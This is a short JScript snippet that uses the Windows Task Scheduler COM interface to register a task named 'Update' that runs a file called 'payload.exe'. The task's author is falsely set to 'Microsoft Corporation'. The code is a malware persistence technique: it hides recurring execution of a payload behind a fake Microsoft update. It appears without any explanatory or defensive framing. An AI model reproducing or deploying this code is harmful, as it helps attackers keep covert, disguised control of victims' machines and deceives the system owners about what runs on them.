var service = new ActiveXObject("Schedule.Service");
service.Connect();
var task = service.NewTask(0);
task.RegistrationInfo.Author = "Microsoft Corporation";
task.Actions.Create(0).Path = "payload.exe";
service.GetFolder("root").RegisterTaskDefinition("Update", task, 6, null, null, 3);
